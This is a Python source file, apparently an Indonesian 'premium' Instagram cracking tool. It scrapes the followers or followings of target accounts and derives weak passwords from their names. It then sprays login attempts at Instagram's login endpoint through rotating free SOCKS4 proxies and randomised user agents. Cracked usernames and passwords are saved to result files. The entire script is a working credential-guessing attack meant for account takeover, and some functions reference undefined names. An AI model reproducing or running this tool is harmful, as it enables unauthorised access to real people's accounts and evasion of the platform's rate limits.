# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
#------- Warna For Rich
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU?
USN="Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)"
# USN="Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_1006D Build/RKQ1.201022.002C677C) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4500.106 Mobile Safari/537.36 Sleipnir/3.5.28"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
    
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow

def banner():
	clear()
	cetak(nel(f"""[blue]\t
┌───────────────────────────────────────────────────────────────────────────────────┐
│                                                                                       │
│                  ███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗                   │
│                  ██╔════╝██╔══██╗██╔══██╗██║  ██║██╔══██╗████╗  ██║                   │
│                  █████╗  ███████║██████╔╝███████║███████║██╔██╗ ██║                   │
│                  ██╔══╝  ██╔══██║██╔══██╗██╔══██║██╔══██║██║╚██╗██║                   │
│                  ██║     ██║  ██║██║  ██║██║  ██║██║  ██║██║ ╚████║                   │
│                  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝                   │
│                                                               [bold cyan]Ig Script 1.0 [pink]hann19     │
└───────────────────────────────────────────────────────────────────────────────────┘[white]

──────────────────────────────────────────────────────────────────────────────────
 [\x1b[1;96m+1] ─ Nama        : FARHANNS
 [\x1b[1;96m+2] ─ WhatsApp    : 6285777639611
 [\x1b[1;96m+3] ─ Facebook    : PORN-HUB
 [\x1b[1;96m+4] ─ Script      : PREMIUM
──────────────────────────────────────────────────────────────────────────────────\n[blue]""",title=f"[white]{waktu()}",style="#00C8FF"))

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            io = '[1] Login Menggunakan Cookie Ya Bang'
            oi = nel(io, style='green')
            cetak(nel(oi, title='Pilih  Login Ye'))
            loginpil=input(f"Piliha :{C} ")
            if loginpil=='1':
             #   wel = '# username tidak boleh salah harus bener dari nama akun tumbal karna kalo tidak akan menyebabkan kan mengumpulkan id 0'
            #    wel2 = mark(wel, style='green')
           #     sol().print(wel2)
                us=input(f'{H}masukan nama akun ig nya:{C}')
                cok=input(f'{H}Masukan Cookie Nya:{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python hann19.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        wel = '# Gunakan username pasword yang sesuai'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        us=input(f"{green}[ Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'{CY}[•] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login sukses')
        os.system('python hann19.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            print(f'{N}[1]└── CRAK DARI PENCARIN NAME{M}(tidak di sarankan)\n{N}[2]└── CRAK DARI PENGIKUT{H} (disaran kan)\n{N}[3]└── CRAK DARI MENGIKUTI{M}(tidak di saran kan\n{N}[4] LAPOR BUG\n[5]└── CHEK OPSI CHEKPOINT\n[0] LOG OUT COOKIE')
       #     io='[1] Crack Dari Pencarian nama\n[2] Crack Dari Pengikut\n[3] Crack dari Mengikuti\n[4]└── LAPOR BUG SCRIPT\n[5]└── CHEK OPSI CHEKPOINT\n[0]└── Log Out Cookie'
          #  oi = nel(io, style='blue')
          #  cetak(nel(oi, title='MENU'))


    def BUG(self):
        bug=f'SILAKAN KLIK LINK DI BAWAH INI UNTUK MELAPOR KE ADMIN\nhttps://wa.me/+6285777639611'
        bug1 = nel(bug, style='green')
        cetak(nel(bug1, title='LAPOR'))
        exit()

    

    def Exit(self):
        kel='# Apakah anda yakin ingin log out ?'
        kel1=mark(kel,style='red')
        sol().print(kel1)
        x=input(f'\n{CY}[•] Jawaban [y/t] : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python hann19.py')
        elif x in ('t','T'):
            os.system('python hann19.py')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}┣[!] Koneksi internet anda error{C}")
            except Exception as e:
                exit(f"\n{M} Username yang anda masukan tidak di temukan, pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (99999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100000&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}Koneksi internet anda error{C}')
            except Exception as e:
                print(f'\n{H} USHER NAME TIDAK DI TEMUKAN{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        pilpass='# PASWORD MANUAL'
        pilpass1=mark(pilpass,style='green')
        sol().print(pilpass1)
        komb='[1]└── NAMA123\n[2]└── NAMA1234\n[3]└── NAMA12345\n[4]└── MANUAL'
        komb1 = nel(komb, style='yellow')
        cetak(nel(komb1))
        c=input(f'{CY}pilih:{C} ')
        if c=='0':
            self.generateAPI(xnx,c)
        elif c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M} Contoh farhan,cantik')
            print('')
            zx=input(f'{CY}[List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        with ThreadPoolExecutor(max_workers=15) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                except:
                    pass
        print('\n')
        oi='# CRACK TELAH SELESAI'
        io=mark(oi,style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{C}[{C}{loop}/{len(internal)}{C}] {H}[ OK: {len(success)}]{C}  {K}[ CP: {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 10;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'
                c='Mozilla/5.0 (Linux; U; Android 10; en-US; MED-LX9 Build/HUAWEIMED-LX9)'
                c='Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36'
                c='Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Safari/537.36'
                c='Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB30M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[•]NAMA: {nama}\n[•]USERNAME : {user}\n[•]PASWORD : {pw}\n[•]PENGIKUT : {pengikut}\n[•]USER-AGENT:{uaku}\n[•]hasil di simpan ke live/{day}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title='LIVE'))
                    open(f"result/LIVE-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[•]NAMA     : {nama}\n[•]Username : {user}\n[•]PASWORD: {pw}\n[•]PENGIKUT : {pengikut}\n[•]hasil di simpan ke chek/{day}'
                    print('\n')
                    oi=nel(io,style='yellow')
                    cetak(nel(oi, title='CHEK'))
                    open(f"result/CHEK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}')
                    checkpoint.append(user)
                    break

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': user_agent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'{nama}\n{user}\n{pw}\n{pengikut}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHEK POINT'))

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'{nama}\n{user}\n{pw}\n{pengikut}'
                oi = nel(io, style='white')
                print('\n')
                cetak(nel(oi, title=' SORRY AKUN ANDA CHEK POINT YAHAHAHA KASIAN'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f' {H}[PILIH] :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            mas='# mau berapa targat tante? '
            mas1=mark(mas,style='green')
            sol().print(mas1)
            m=int(input(f'\n{H}Jumlah : {C}'));print('')
            mas='# Masukan nama random untuk di searching'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}Masukan jumlah target ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            mas=input(' └── SILAKAN ENTER UNTUK MELANJUTKAN CRACK ')
            if mas in ['t','T']:
                masal(self)
            elif mas in ['','']:
                massal(self)
            elif mas in ['h','h']:
                print('ISI JANGAN DI KOSONGIN')


        
        elif c in ('3','03'):
            mas=input('ingin crack masal? y/n? ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['n','N']:
                meng(self)
            elif mas in ['']:
                print('Y ATAU T Begoo0')


        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{CY}+Total Result MASTER_FU{H}{len(g)}{C}')
            print(f'\n{CY}!Proses mengecek status akun. silahkan tunggu sebentar ya tot{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}┣[#] proses check telah selesai...{C}')

        elif c in ('04','4'):
            self.BUG()
        elif c in ('00','0'):
            self.Exit()

        else:
            self.menu()
      
def key():
    os.system("clear")
    banner()
    key = input(" [?] Masukan license : ")
    try:
        ses = requests.Session()
        asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyMzQzNDM1OSIsIlBsbmx6K3p6ZnIvanVUaTBjWjIvMy9vMWU1QlZxbXU3MVFzTi9JaHMiXQ==&ProductId=16316&Key=%s"%(key)).json()['licenseKey']['key']
        open("key.txt","w").write(key)
        cetak(nel(f""" [×] License Aktif"""))
        time.sleep(3)
        login_kamu()
    except KeyError:
        cetak(nel(f"[×] License anda invalid",style="white"));time.sleep(3);exit()
def cek():
   try:x=open("key.txt","r").read()
   except FileNotFoundError:key()
   try:
        x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyMzQzNDM1OSIsIlBsbmx6K3p6ZnIvanVUaTBjWjIvMy9vMWU1QlZxbXU3MVFzTi9JaHMiXQ==&ProductId=16316&Key=%s"%(x)).json()['licenseKey']['key']
        login_kamu()
   except KeyError:
        #invalid
        # coded key by hann-19
        key()

def Selamat():
    print("")
    clear()
    jalan(f"Selamat Datang Di Tools Crack Ig Premium\nGunakan Tools Ini Sewajar Nya Dan\nDan Gunakan Dengan Bijak\nBila Tidak Di Gunakan Dengan Bijak Bukan Tanggung Jawab Kami\nSELAMAT BERSENANG SENANG")
    login_kamu()

def mengi(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Mau berapa target njing: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)



def meng(self):
    mas='# Target harus bersifat publik jangan privat'
    mas1=mark(mas,style='red')
    sol().print(mas1)
    m=input(f'{CY}MASUKAN NAMA TARGET└── {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{R}[?{R}] mau berapa target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# BERHASIL TERKUMPUL:{len(internal)}'
                pi=mark(so,style='green')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            m=input(f'{CY}└── NAMA TARGET:{C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')

